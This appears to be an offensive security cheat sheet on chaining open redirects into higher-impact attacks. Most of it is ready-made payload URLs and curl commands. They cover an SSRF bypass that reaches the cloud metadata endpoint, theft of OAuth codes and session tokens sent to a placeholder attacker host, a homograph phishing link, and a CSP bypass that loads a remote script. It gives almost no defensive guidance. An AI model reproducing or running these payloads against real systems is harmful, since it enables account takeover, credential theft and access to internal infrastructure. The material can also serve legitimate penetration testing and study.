# Chaining Open Redirect to Higher-Impact Attacks

## Summary
Open redirect is rarely critical on its own but chains powerfully with other vulnerabilities.

## Chaining to SSRF

```bash
# Redirect can bypass SSRF URL allow lists
# If server follows redirects when fetching URLs:

# Step 1: Find open redirect on target.com
https://target.com/redirect?url=http://internal-service/admin

# Step 2: Use it in an SSRF-vulnerable endpoint that follows redirects
https://target.com/fetch?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/

# The server fetches: target.com/redirect?... which then redirects to internal metadata
curl "https://target.com/ssrf-endpoint?url=https://target.com/redirect%3Furl%3Dhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
```

## OAuth Token Theft

```bash
# If the OAuth provider uses open redirect as valid redirect_uri:
# Step 1: Register app on OAuth provider with redirect_uri = target.com/open-redirect
# Step 2: Initiate OAuth flow, intercept the authorization code
# Step 3: Redirect to attacker.com via the open redirect

https://oauth-provider.com/auth?client_id=xxx&redirect_uri=https://target.com/oauth/callback%3Fredirect%3Dhttp://attacker.com/steal

# If the auth code is appended as a query parameter:
https://target.com/oauth/callback?code=xxxx -> redirects to -> http://attacker.com/steal?code=xxxx

# The attacker now has the OAuth code and can exchange it for tokens
```

## Phishing Campaign

```bash
# Open redirect makes phishing URLs appear legitimate

# Victim sees: https://target.com/logout?redirect=http://attacker.com/fake-login
# The initial URL is target.com — victim trusts it

# Combined with IDN homograph for advanced phishing:
https://target.com/logout?redirect=https://tаrget.com/login  # Cyrillic а
```

## Session Fixation via Redirect

```bash
# Some apps append session tokens in redirect URLs
GET /login?redirect=http://attacker.com
Location: http://attacker.com?session=abc123

# Attacker captures session token from referrer or logs
```

## Cookie Theft via Redirect with Referrer Policy

```bash
# If the redirect strips the Referrer-Policy header
# The target server may see the full URL including query params in Referer

# Victim visits:
https://target.com/profile?token=secret -> redirects to -> http://attacker.com/
# Attacker logs the Referer header: https://target.com/profile?token=secret
```

## Bypassing CSP for XSS

```bash
# CSP with strict-dynamic but open redirect allows script injection
# If CSP whitelists target.com and it has an open redirect:

# Craft payload that loads attacker script via the redirect:
<script src="https://target.com/redirect?url=http://attacker.com/evil.js"></script>

# CSP trusts target.com, but the response is a redirect to attacker.com,
# and the browser follows it — the script from attacker.com executes
```

## Automation Examples

```bash
# Scan for chained SSRF using open redirect as bypass
curl -v "https://target.com/fetch?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
```

